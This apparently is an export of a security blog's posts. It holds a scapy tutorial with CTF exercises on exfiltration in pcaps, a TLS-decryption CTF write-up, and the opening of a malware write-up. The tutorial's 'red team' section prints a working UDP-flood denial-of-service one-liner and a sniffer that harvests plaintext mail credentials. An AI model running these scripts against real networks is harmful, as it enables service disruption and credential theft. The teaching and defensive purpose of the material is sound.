\u0026#39;svgdump\u0026#39;, \u0026#39;time\u0026#39;, \u0026#39;type\u0026#39;, \u0026#39;underlayer\u0026#39;, \u0026#39;upper_bonds\u0026#39;, \u0026#39;wirelen\u0026#39;] \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; first_packet.show() ###[ Ethernet ]### dst = fe:ff:20:00:01:00 src = 00:00:01:00:00:00 type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0 len = 48 id = 3905 flags = DF frag = 0 ttl = 128 proto = tcp chksum = 0x91eb src = 145.254.160.237 dst = 65.208.228.223 \\options \\ ###[ TCP ]### sport = 3372 dport = http seq = 951057939 ack = 0 dataofs = 7 reserved = 0 flags = S window = 8760 chksum = 0xc30c urgptr = 0 options = [(\u0026#39;MSS\u0026#39;, 1460), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;SAckOK\u0026#39;, b\u0026#39;\u0026#39;)] \u0026gt;\u0026gt;\u0026gt; By using the interactive mode, we have access to the variables of the script. For example, we read the pcap file into a variable named pcap. Now we access the first value of this variable which is the first packet and store it in first_packet. Now, by using dir we can see the various fields it contains. One note here is that dir has nothing to do with scapy. It is a python keyword to find what methods are supported by your object.\nThe dir keyword outputted the supported methods of our object - the first packet. One of its supported methods is the show() method. By using this method, we get back detailed information about all the supported layers of the packet but also the fields within each layer.\nAnother nice way to see what available attributes a packet has is by using the tab-completion that will output available attributes of a packet:\n\u0026gt;\u0026gt;\u0026gt; first_packet. Display all 104 possibilities? (y or n) first_packet.add_parent( first_packet.comment first_packet.do_dissect_payload( first_packet.haslayer( first_packet.pdfdump( first_packet.show2( first_packet.add_payload( first_packet.copy() first_packet.do_init_cached_fields() first_packet.hide_defaults() first_packet.post_build( first_packet.show_indent first_packet.add_underlayer( first_packet.copy_field_value( first_packet.do_init_fields( first_packet.init_fields() first_packet.post_dissect( first_packet.show_summary first_packet.aliastypes first_packet.copy_fields_dict( first_packet.dst first_packet.iterpayloads() first_packet.post_dissection( first_packet.sniffed_on first_packet.answers( first_packet.decode_payload_as( first_packet.explicit first_packet.json() first_packet.post_transforms first_packet.sprintf( first_packet.build() first_packet.default_fields first_packet.extract_padding( first_packet.lastlayer( first_packet.pre_dissect( first_packet.src first_packet.build_done( first_packet.default_payload_class( first_packet.fields first_packet.layers() first_packet.prepare_cached_fields( first_packet.stop_dissection_after first_packet.build_padding() first_packet.delfieldval( first_packet.fields_desc first_packet.lower_bonds() first_packet.psdump( first_packet.summary( first_packet.build_ps( first_packet.deprecated_fields first_packet.fieldtype first_packet.match_subclass first_packet.raw_packet_cache first_packet.svgdump( first_packet.canvas_dump( first_packet.direction first_packet.firstlayer() first_packet.mysummary() first_packet.raw_packet_cache_fields first_packet.time first_packet.class_default_fields first_packet.dispatch_hook( first_packet.fragment( first_packet.name first_packet.remove_parent( first_packet.type first_packet.class_default_fields_ref first_packet.display( first_packet.from_hexcap() first_packet.original first_packet.remove_payload() first_packet.underlayer first_packet.class_dont_cache first_packet.dissect( first_packet.get_field( first_packet.overload_fields first_packet.remove_underlayer( first_packet.upper_bonds() first_packet.class_fieldtype first_packet.dissection_done( first_packet.getfield_and_val( first_packet.overloaded_fields first_packet.route() first_packet.wirelen first_packet.class_packetfields first_packet.do_build() first_packet.getfieldval( first_packet.packetfields first_packet.self_build() first_packet.clear_cache() first_packet.do_build_payload() first_packet.getlayer( first_packet.parent first_packet.sent_time first_packet.clone_with( first_packet.do_build_ps() first_packet.guess_payload_class( first_packet.payload first_packet.setfieldval( first_packet.command() first_packet.do_dissect( first_packet.hashret() first_packet.payload_guess first_packet.show( \u0026gt;\u0026gt;\u0026gt; first_packet. Now, recall we want to get the chksum value of that packet (and compare it with the image above). We notice that the chksum=0xc30c exists in the TCP layer. But what is the correct syntax?\nWell, to get the fields that exist in a layer, we always start by using the name of the layer as the key - as if it was a list:\n\u0026gt;\u0026gt;\u0026gt; first_packet.show() ###[ Ethernet ]### dst = fe:ff:20:00:01:00 src = 00:00:01:00:00:00 type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0 len = 48 id = 3905 flags = DF frag = 0 ttl = 128 proto = tcp chksum = 0x91eb src = 145.254.160.237 dst = 65.208.228.223 \\options \\ ###[ TCP ]### sport = 3372 dport = http seq = 951057939 ack = 0 dataofs = 7 reserved = 0 flags = S window = 8760 chksum = 0xc30c urgptr = 0 options = [(\u0026#39;MSS\u0026#39;, 1460), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;SAckOK\u0026#39;, b\u0026#39;\u0026#39;)] We see that the chksum field exists inside the TCP layer. Imagine the packets as a tree struct. In order to get a field, we need to first visit its parent.\nSince the chksum exists inside TCP, let\u0026rsquo;s get the TCP layer first:\n\u0026gt;\u0026gt;\u0026gt; first_packet[TCP] \u0026lt;TCP sport=3372 dport=http seq=951057939 ack=0 dataofs=7 reserved=0 flags=S window=8760 chksum=0xc30c urgptr=0 options=[(\u0026#39;MSS\u0026#39;, 1460), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;NOP\u0026#39;, None), (\u0026#39;SAckOK\u0026#39;, b\u0026#39;\u0026#39;)] |\u0026gt; If we again are not sure what info we want, we can use the dir keyword once again and see the available options:\n[\u0026#39;_PickleType\u0026#39;, \u0026#39;__all_slots__\u0026#39;, \u0026#39;__bool__\u0026#39;, \u0026#39;__bytes__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__class_getitem__\u0026#39;, \u0026#39;__contains__\u0026#39;, \u0026#39;__deepcopy__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__delitem__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__div__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattr__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__getitem__\u0026#39;, \u0026#39;__getstate__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__iter__\u0026#39;, \u0026#39;__iterlen__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__len__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__mul__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__nonzero__\u0026#39;, \u0026#39;__orig_bases__\u0026#39;, \u0026#39;__parameters__\u0026#39;, \u0026#39;__rdiv__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__rmul__\u0026#39;, \u0026#39;__rtruediv__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__setitem__\u0026#39;, \u0026#39;__setstate__\u0026#39;, \u0026#39;__signature__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__slots__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__truediv__\u0026#39;, \u0026#39;__weakref__\u0026#39;, \u0026#39;_answered\u0026#39;, \u0026#39;_command\u0026#39;, \u0026#39;_do_summary\u0026#39;, \u0026#39;_is_protocol\u0026#39;, \u0026#39;_name\u0026#39;, \u0026#39;_overload_fields\u0026#39;, \u0026#39;_pkt\u0026#39;, \u0026#39;_raw_packet_cache_field_value\u0026#39;, \u0026#39;_resolve_alias\u0026#39;, \u0026#39;_show_or_dump\u0026#39;, \u0026#39;_superdir\u0026#39;, \u0026#39;ack\u0026#39;, \u0026#39;add_parent\u0026#39;, \u0026#39;add_payload\u0026#39;, \u0026#39;add_underlayer\u0026#39;, \u0026#39;aliastypes\u0026#39;, \u0026#39;answers\u0026#39;, \u0026#39;build\u0026#39;, \u0026#39;build_done\u0026#39;, \u0026#39;build_padding\u0026#39;, \u0026#39;build_ps\u0026#39;, \u0026#39;canvas_dump\u0026#39;, \u0026#39;chksum\u0026#39;, \u0026#39;class_default_fields\u0026#39;, \u0026#39;class_default_fields_ref\u0026#39;, \u0026#39;class_dont_cache\u0026#39;, \u0026#39;class_fieldtype\u0026#39;, \u0026#39;class_packetfields\u0026#39;, \u0026#39;clear_cache\u0026#39;, \u0026#39;clone_with\u0026#39;, \u0026#39;command\u0026#39;, \u0026#39;comment\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;copy_field_value\u0026#39;, \u0026#39;copy_fields_dict\u0026#39;, \u0026#39;dataofs\u0026#39;, \u0026#39;decode_payload_as\u0026#39;, \u0026#39;default_fields\u0026#39;, \u0026#39;default_payload_class\u0026#39;, \u0026#39;delfieldval\u0026#39;, \u0026#39;deprecated_fields\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;display\u0026#39;, \u0026#39;dissect\u0026#39;, \u0026#39;dissection_done\u0026#39;, \u0026#39;do_build\u0026#39;, \u0026#39;do_build_payload\u0026#39;, \u0026#39;do_build_ps\u0026#39;, \u0026#39;do_dissect\u0026#39;, \u0026#39;do_dissect_payload\u0026#39;, \u0026#39;do_init_cached_fields\u0026#39;, \u0026#39;do_init_fields\u0026#39;, \u0026#39;dport\u0026#39;, \u0026#39;explicit\u0026#39;, \u0026#39;extract_padding\u0026#39;, \u0026#39;fields\u0026#39;, \u0026#39;fields_desc\u0026#39;, \u0026#39;fieldtype\u0026#39;, \u0026#39;firstlayer\u0026#39;, \u0026#39;flags\u0026#39;, \u0026#39;fragment\u0026#39;, \u0026#39;from_hexcap\u0026#39;, \u0026#39;get_field\u0026#39;, \u0026#39;getfield_and_val\u0026#39;, \u0026#39;getfieldval\u0026#39;, \u0026#39;getlayer\u0026#39;, \u0026#39;guess_payload_class\u0026#39;, \u0026#39;hashret\u0026#39;, \u0026#39;haslayer\u0026#39;, \u0026#39;hide_defaults\u0026#39;, \u0026#39;init_fields\u0026#39;, \u0026#39;iterpayloads\u0026#39;, \u0026#39;json\u0026#39;, \u0026#39;lastlayer\u0026#39;, \u0026#39;layers\u0026#39;, \u0026#39;lower_bonds\u0026#39;, \u0026#39;match_subclass\u0026#39;, \u0026#39;mysummary\u0026#39;, \u0026#39;name\u0026#39;, \u0026#39;options\u0026#39;, \u0026#39;original\u0026#39;, \u0026#39;overload_fields\u0026#39;, \u0026#39;overloaded_fields\u0026#39;, \u0026#39;packetfields\u0026#39;, \u0026#39;parent\u0026#39;, \u0026#39;payload\u0026#39;, \u0026#39;payload_guess\u0026#39;, \u0026#39;pdfdump\u0026#39;, \u0026#39;post_build\u0026#39;, \u0026#39;post_dissect\u0026#39;, \u0026#39;post_dissection\u0026#39;, \u0026#39;post_transforms\u0026#39;, \u0026#39;pre_dissect\u0026#39;, \u0026#39;prepare_cached_fields\u0026#39;, \u0026#39;psdump\u0026#39;, \u0026#39;raw_packet_cache\u0026#39;, \u0026#39;raw_packet_cache_fields\u0026#39;, \u0026#39;remove_parent\u0026#39;, \u0026#39;remove_payload\u0026#39;, \u0026#39;remove_underlayer\u0026#39;, \u0026#39;reserved\u0026#39;, \u0026#39;route\u0026#39;, \u0026#39;self_build\u0026#39;, \u0026#39;sent_time\u0026#39;, \u0026#39;seq\u0026#39;, \u0026#39;setfieldval\u0026#39;, \u0026#39;show\u0026#39;, \u0026#39;show2\u0026#39;, \u0026#39;show_indent\u0026#39;, \u0026#39;show_summary\u0026#39;, \u0026#39;sniffed_on\u0026#39;, \u0026#39;sport\u0026#39;, \u0026#39;sprintf\u0026#39;, \u0026#39;stop_dissection_after\u0026#39;, \u0026#39;summary\u0026#39;, \u0026#39;svgdump\u0026#39;, \u0026#39;time\u0026#39;, \u0026#39;underlayer\u0026#39;, \u0026#39;upper_bonds\u0026#39;, \u0026#39;urgptr\u0026#39;, \u0026#39;window\u0026#39;, \u0026#39;wirelen\u0026#39;] We are interested in the chksum value, so let\u0026rsquo;s use a dot and then the name of the field to get it:\n\u0026gt;\u0026gt;\u0026gt; first_packet[TCP].chksum 49932 \u0026gt;\u0026gt;\u0026gt; hex(_) \u0026#39;0xc30c\u0026#39; \u0026gt;\u0026gt;\u0026gt; Now that we know how to get the value, we could tranfer this to our script and get this field for each packet (assuming we would need that for a purpose - as we will later see in another example):\nfrom scapy.all import * pcap = rdpcap(\u0026#34;./http.cap\u0026#34;) for i, p in enumerate(pcap): # Check if TCP layer is present in the current packet with the haslayer(layer) method if p.haslayer(TCP): print(f\u0026#34;Packet No.{i} has chksum = {hex(p[TCP].chksum)}\u0026#34;) and the output is:\n└─$ python parser.py Packet No.0 has chksum = 0xc30c Packet No.1 has chksum = 0x5bdc Packet No.2 has chksum = 0x7964 Packet No.3 has chksum = 0xa958 Packet No.4 has chksum = 0x8421 Packet No.5 has chksum = 0x2b0a ... ... Examples [blue team] Let\u0026rsquo;s see some relevant examples where we would need to get the same field from each packet.\nExample 1: Exfiltration via port number - NIXU Challenge This is a very nice challenge to showcase examples where we might need to get a specific field from all packets. In the ports challenge from the nixu challenge this is exactly what\u0026rsquo;s going on: Data have been exfiltrated through the destination port number.\nOpening the file in Wireshark we can observe straight away that the ports look kinda odd (and when I say odd, I mean that they are inside the ascii range):\nThe solution to this CTF challenge is to get each port number and convert the decimal to the ascii representation, which will output the flag. But obviously we don\u0026rsquo;t want to do this manually and get each number by hand, so scapy will come handly since it will extract each port number and decode it for us. We saw earlier that by using the .show() method on a packet, we get various fields that the current packet contains. One of them was a field named dport which is basically the destination port. We could again evaluate this claim by running the script in interactive mode and finding the correct field ourselfs:\n└─$ python -i port_message.py \u0026gt;\u0026gt;\u0026gt; first_packet = pcap[0] \u0026gt;\u0026gt;\u0026gt; first_packet.dport 81 \u0026gt;\u0026gt;\u0026gt; Now that we found what member is the appropriate one to get the port number back, let\u0026rsquo;s develop a script to get every destination port from each packet and convert it to it\u0026rsquo;s ascii equivalent:\nfrom scapy.all import * pkts = rdpcap(\u0026#39;ports.pcap\u0026#39;) ports = [chr(p.dport) for p in pkts] print(\u0026#34;\u0026#34;.join(ports)) Running the script outputs:\n└─$ python port_message.py QVZLSHtmbHpvYnlmX25hcV9haHpvcmVmX25lcl9zaGFfZ2JfY3lubF9qdmd1fQ== which is a base64 string and if we decode it we will get the flag. Now imagine doing this by hand\u0026hellip;\nExample 2: Exfiltration via ICMP ping In this example we are going to go over an old HTB challenge (that has been retired) and I was super lucky to have kept it in my VM.\nIn that challenge, there was an ICMP exfiltration going on that exfiltrated a compressed archive. The goal was to recontruct the exfilled data part by part and get the final compressed file.\nObviously, this would be a really time consuming task to do it manually for each packet and thus this challenge is another good example of how powerful and useful scapy can be. Let\u0026rsquo;s begin!\nOpening the pcap file and using the icmp filter, we are met with the following packets:\nWe see straight away that the first ICMP packet is of echo type request and it contains the PK headers - headers that zip archives have, so probably a zip file got exfiltrated.\nAlso, if we have a look at the second icmp packet which is of type reply, we will see that the same data that were in the request packet are being returned:\nSo, things to take away from here:\nWe are interested only in icmp echo request type of packets. We are probably expecting a zip file reconstruction from these packets. We can start creating our scapy script and play around with the interactive mode to find the appropriate commands to reconstruct the zip:\nfrom scapy.all import * pcap = rdpcap(\u0026#34;./older_trick.pcap\u0026#34;) icmp = [p for p in pcap if p.haslayer(ICMP)] Here, I used knowledge from the previous example where we were checking if a packet had a TCP layer. Now we are interested only for packets with ICMP layer, so that is why we want to store only such packets.\nUsing the interactive mode to observe the layers and attributes of the packets, we verify that the icmp request and icmp response packets contain the same data:\nIf we see again the layers, we notiec an attribute called type, where in the request packets it has always value 8, while on the response packets it has always 0:\nSince we are interested in the request packets (the ones with type value 8), we update our script as such to read only these packets:\nfrom scapy.all import * pcap = rdpcap(\u0026#34;./older_trick.pcap\u0026#34;) icmp = [p for p in pcap if p.haslayer(ICMP) and p[ICMP].type == 8] Now, turning back to the interactive mode, we can verify that we only have request type packets and we can notice an interesting pattern:\n└─$ python -i reconstruct_zip.py \u0026gt;\u0026gt;\u0026gt; icmp[0].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00\\xb7\\xae\\x04\\x00\\x00\\x00\\x00\\x00PK\\x03\\x04\\x14\\x00\\x00\\x00\\x00\\x00r\\x9e\\x8dRe\\x9bPK\\x03\\x04\\x14\\x00\\x00\\x00\\x00\\x00r\\x9e\\x8dRe\\x9bPK\\x03\\x04\\x14\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; icmp[1].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00\\xea\\xd1\\x04\\x00\\x00\\x00\\x00\\x00Lk\\x18\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x10\\x00\\x00\\x00fiLk\\x18\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x10\\x00\\x00\\x00fiLk\\x18\\x00\\x00\\x00\\x18\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; icmp[2].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00\\x99\\xe8\\x04\\x00\\x00\\x00\\x00\\x00ni/addons.json{\u0026#34;ni/addons.json{\u0026#34;ni/addon\u0026#39; \u0026gt;\u0026gt;\u0026gt; icmp[3].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00\\xca\\xfb\\x04\\x00\\x00\\x00\\x00\\x00schema\u0026#34;:6,\u0026#34;addonschema\u0026#34;:6,\u0026#34;addonschema\u0026#34;:\u0026#39; \u0026gt;\u0026gt;\u0026gt; icmp[4].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00(\\x18\\x05\\x00\\x00\\x00\\x00\\x00s\u0026#34;:[]}PK\\x03\\x04\\x14\\x00\\x00\\x00\\x08\\x00s\u0026#34;:[]}PK\\x03\\x04\\x14\\x00\\x00\\x00\\x08\\x00s\u0026#34;:[]}PK\u0026#39; \u0026gt;\u0026gt;\u0026gt; icmp[5].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00m3\\x05\\x00\\x00\\x00\\x00\\x00\\x1d\\xa3\\x8dR\\xec\\x0f\\xbb\\xb6\\xd0\\x08\\x00\\x00g\\n\\x00\\x00\\x1d\\xa3\\x8dR\\xec\\x0f\\xbb\\xb6\\xd0\\x08\\x00\\x00g\\n\\x00\\x00\\x1d\\xa3\\x8dR\\xec\\x0f\\xbb\\xb6\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; icmp[0].load.index(b\u0026#34;PK\u0026#34;) 16 \u0026gt;\u0026gt;\u0026gt; icmp[2].load.index(b\u0026#34;ni/addons\u0026#34;) 16 \u0026gt;\u0026gt;\u0026gt; icmp[3].load.index(b\u0026#34;schema\u0026#34;) 16 The pattern is that all interesting words (the ones that do not look like random bytes) start at index 16 of each packet and then they just repeat.\nTo avoid the repetition of the data and get only the first occurance of them, we simply need to go to one packet and count how many bytes there are until the re-occurance of them:\n└─$ python -i reconstruct_zip.py \u0026gt;\u0026gt;\u0026gt; icmp[0].load b\u0026#39;(\\xecu`\\x00\\x00\\x00\\x00\\xb7\\xae\\x04\\x00\\x00\\x00\\x00\\x00PK\\x03\\x04\\x14\\x00\\x00\\x00\\x00\\x00r\\x9e\\x8dRe\\x9bPK\\x03\\x04\\x14\\x00\\x00\\x00\\x00\\x00r\\x9e\\x8dRe\\x9bPK\\x03\\x04\\x14\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; len(b\u0026#34;PK\\x03\\x04\\x14\\x00\\x00\\x00\\x00\\x00r\\x9e\\x8dRe\\x9b\u0026#34;) 16 \u0026gt;\u0026gt;\u0026gt; icmp[0].load[16:32] b\u0026#39;PK\\x03\\x04\\x14\\x00\\x00\\x00\\x00\\x00r\\x9e\\x8dRe\\x9b\u0026#39; \u0026gt;\u0026gt;\u0026gt; So the exfiltrated data from each packet start at index 16 and stop at index 32. These observations should be enough to reconstruct the exfiltrated zip archive. Let\u0026rsquo;s turn back to our python script to complete it:\nfrom scapy.all import * pcap = rdpcap(\u0026#34;./older_trick.pcap\u0026#34;) icmp = [p for p in pcap if p.haslayer(ICMP) and p[ICMP].type == 8] exfiltrated_data = b\u0026#34;\u0026#34; for p in icmp: exfiltrated_data += p.load[16:32] with open(\u0026#34;exfiltrated_data.zip\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(exfiltrated_data) Running our script, we indeed get back the reconstructed zip file:\nExample 3: Detecting suspicious IP addresses In this and final example, we will see an overview of how we could identify a suspicious IP address that tries to DoS a website, or a possible C2 server communicating with a victim machine.\nThe presented code is taken from the Cyber Defense Lab of the Royal Military Academy in Belgium blog, so for further information related to the example you can read this blog:)\nAccording to this blog, the following part of code using scapy is very similar to the approach of how a SIEM software would create alerts.\nfrom scapy.all import * packets = PcapReader(\u0026#34;capture.pcap\u0026#34;) counts = {} # QR = Query Response # ANCOUNT = Answer Count # https://datatracker.ietf.org/doc/html/rfc5395#section-2 for packet in packets: if packet.haslayer(DNS) and packet[DNS].qr == 1 and packet[DNS].ancount == 0: # DNS query returned no answer # extract the destination IP (device that sent the query) ip = packet[IP].dst counts[ip] = counts.get(ip, 0) + 1 threshold = 100 print(\u0026#34;+ Create list of suspicious IP addresses ...\u0026#34;) suspicious = [] for ip, occurrences in counts.items(): if occurrences \u0026lt; threshold: continue suspicious.append(ip) print(suspicious) This code sample was made for detecting DGA malware, a malware that would receive a lot of DNS replies (packet[DNS].qr == 1) with no answer (packet[DNS].ancount == 0).\nSo the purpose of the script would be to create a dictionary of IP addresses found in the pcap file and identify such IP addresses that would generate the DNS traffic.\nHere, the threshold is 100 and it probably would create a lot of false positives depending on the victim\u0026rsquo;s network (i.e. for a coorporate network we would have a lot of false positives with that threshold). The blog goes through details of how you could use statistics to find the threshold value in a sensible way.\nExamples [red team] Beside using scapy to solve a CTF challenge or maybe create a SIEM type of software, scapy can be also used for neferious purposes.\nExample 1: UDP flood for DoS An example of using scapy for flooding a target IP with UDP packets, which as a result causes the system to process these packets rather than legitimate ones (resulting in a Dos), is the following simple PoC script:\nfrom scapy.all import * send(IP(dst=\u0026#34;some_target_IP\u0026#34;)/fuzz(UDP()),loop=1) Using the fuzz(UDP()) function, the script generates random variations of UDP packets, and since it also uses loop=1 which makes the script run continuously, it overwhelms the target machine resulting in a Dos.\nExample 2: Sniffing traffic to steal plaintext credentials Another cool example of using scapy for malicious purposes is the one where you could make a sniffer and try to find plaintext credentials in TCP packets:\nfrom scapy.all import sniff, TCP, IP def packet_callback(packet): if packet[TCP].payload: mypacket = str(packet[TCP].payload) if \u0026#39;user\u0026#39; in mypacket.lower() or \u0026#39;pass\u0026#39; in mypacket.lower(): print(f\u0026#34;[*] Destination: {packet[IP].dst}\u0026#34;) print(f\u0026#34;[*] {str(packet[TCP].payload)}\u0026#34;) sniff(filter=\u0026#39;tcp port 110 or tcp port 25 or tcp port 143\u0026#39;,prn=packet_callback, store=0) With this script, a sniffer is set to run continuously, filtering on specific tcp ports and calling the packet_callback function for each new packet.\nIf the found packet has some payload (data) inside the TCP layer, then the script checks whether words such as user or pass exist in it, since that would mean potential credentials are being transmitted.\nIf all the above are true, the script prints the destination of the packet (where the credentials would be used) but also the credentials themselfs.\nSummary In this post we did an overview of how scapy can be used for both defensive and offensive purposes, but also for just some fun CTF challenges.\nThe attributes that each packet has and how these could be used for all the forementioned purposes are too many and would require a really extensive post, which was not the goal of this post.\nThe goal for this post was to get a bit more familiar with scapy and show how to approach a problem by crafting a script part by part with the help of the interactive mode and the various keywords we used in order to find what you are looking for. I hope you had as much fun reading this as I had writing it:)\nReferences\n[1] Scapy: Welcome to Scapy's documentation!\r[2] Thibault Debatty: Network traffic analysis with Python, Scapy (and some Machine Learning)\r[3] pyddos: Examples of python SCAPY lib for DDOS (udp, syn flood etc).\r[4] Yen: Python for Cybersecurity 30 — Scapy\r","permalink":"http://localhost:1313/posts/scapy/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eIn this post we will explore the scapy library in python and its features when it comes to analyzing pcap files. In general, scapy library can be used for both red team (sniffing traffic) and blue team operations (analyzing pcap files). We will stick to the second one for this post.\u003c/p\u003e\n\u003cp\u003eI learned about scapy back when I started playing CTF challenges and was trying to solve a challenge where data had been exfiltrated through the ICMP protocol (we will see that challenge later). The idea in that challenge was that data was exfiltrated from the victim machine through ping requests - byte by byte. As you can tell, it was really difficult to manually reconstruct the exfiltrated data as this would mean copying and pasting the corresponding data from each packet. This is not really practical if you have a big pcap file.\u003c/p\u003e","title":"Exploring scapy for blue and red team operations"},{"content":"Unzipping the provided file, we extract the following files:\nThis time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:\nSo we will ignore this for now and open the provided “.pcap” file with Wireshark:\nThis time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols. To view all protocols detected by Wireshark, we can navigate to “Statistics  Protocol Hierarchy” and get the following information:\nSearching for HTTP requests, which in most cases reveal almost immediately fruitful information leads to a dead end:\nWe turn back to the protocol hierarchy and we see that TLS is used about 21% from the total network traffic protocol types. Googling what TLS is, we find out that it is a protocol used for encrypting data before being sent over the internet.\nSo, since we can’t see the full traffic because of the encryption, we ideally would like to decrypt it. Searching for how to decrypt TLS traffic in Wireshark we find the following:\nWe remember that a log file is given to us, so it seems like we are in the right track. Reading the article, the following steps are suggested:\nFollowing the steps above and providing the sslkeylog.log as the (Pre)-Master-Secret log filename decrypts the traffic:\nWe can finally start to see clear packets. Revisiting “http” requests though leads to the same packets we previously found. If we enumerate the whole decrypted “.pcap”, we will notice (just like in the previous image) that we indeed have some “GET” requests, but with HTTP2 protocol. HTTP2 is basically an HTTP variant that compresses data more:\nFiltering for “HTTP2” requests, we are met with the following packets:\nWe can see a lot of GET requests, some POST requests and some responses.\nWe can play with the filters and use one like the following for more organized results:\nHere I used a specific filter for “GET” requests in HTTP2 protocol and also chose the destination to be the ip “104.20.67.143” since all the strange GET requests were send to this domain. Taking about domains, looking at one of the packets, we see that this destination ip is actually this domain:\n\u0026gt; Header: :authority: pastebin.com \u0026gt; Header: :scheme: https \u0026gt; Header: :path: /79CbDmEE Googling what “Pastebin.com” is makes the traffic we found even more suspicious. We will find out that it is a website that allows users to share plaintext through public posts called \u0026ldquo;pastes\u0026rdquo;. It is common for hackers to upload payloads or leaked information there to be able to reference them later on.\nMaybe a flag has been posted to one of the paths found in Wireshark?\nSince we have a lot of “GET /path” requests, instead of navigating manually to each one, we are going to create a python script to automate this process.\nI ended up with the following:\nimport pyshark import requests import re cap = pyshark.FileCapture(\u0026#34;patterns.pcapng\u0026#34;,display_filter=\u0026#39;(http2.header.value==\u0026#34;GET\u0026#34;) and (http2.header.value contains pastebin) and (http2.header.name.length \u0026gt; 18)\u0026#39;) pkts = [p for p in cap] for packet in pkts: path = packet.http2.stream.split(\u0026#39;,\u0026#39;)[-1][5:] url = \u0026#34;https://pastebin.com\u0026#34;+str(path) r = requests.get(url) if \u0026#34;CTFLIB\u0026#34; in r.text: print(\u0026#34;path which has the flag is : \u0026#34;+str(path)) match = re.search(r\u0026#39;[\\w]+{[\\w]+}\u0026#39;, r.text) \u0026#39;\u0026#39;\u0026#39; the above match translates to : [anystring]{[anystring]} basically any string that is followed by \u0026#39;{\u0026#39;, then contains any string that is followed by \u0026#39;}\u0026#39; \u0026#39;\u0026#39;\u0026#39; print(match.group(0)) break Breakdown of the code:\nImport pyshark library. This library is mimicking Wireshark into a script. By doing this, we can read “.pcap” files and use filters to minimize the results as we saw previously. Here, I used a different filter than the previous one only to showcase a different approach. This script reads the “.pcap” file with the given filter and loops through each packet. It then tries to extract all /[paths] from the GET requests we saw. After it finds the path, it constructs a url with the domain we found (Pastebin) and the path we extracted. It makes a request to the constructed url and uses regular expression to see if the response contains a string that matches the flag format of the challenge. If it does, it prints the flag as well as the path it was found at. Running the code, we get the flag:\n┌──(connar㉿kali)-[~/flagontherun]\r└─$ python pysharkfilter.py\rpath which has the flag is : /mGzAUAg2\rCTFLIB{fl4g_1n_6u6l1c_51gh7} ","permalink":"http://localhost:1313/ctfwriteups/flagontherun/","summary":"\u003cp\u003eUnzipping the provided file, we extract the following files:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/flagontherun/flagontherun1.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eThis time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/flagontherun/flagontherun2.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSo we will ignore this for now and open the provided “.pcap” file with Wireshark:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ctflib/flagontherun/flagontherun3.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eThis time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols. To view all protocols detected by Wireshark, we can navigate to “Statistics  Protocol Hierarchy” and get the following information:\u003c/p\u003e","title":"Flag on the run - Writeup"},{"content":"We\u0026rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named \u0026ldquo;GTAVI.exe\u0026rdquo;.\nUpon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:\nAnd after clicking the \u0026lsquo;OK\u0026rsquo; 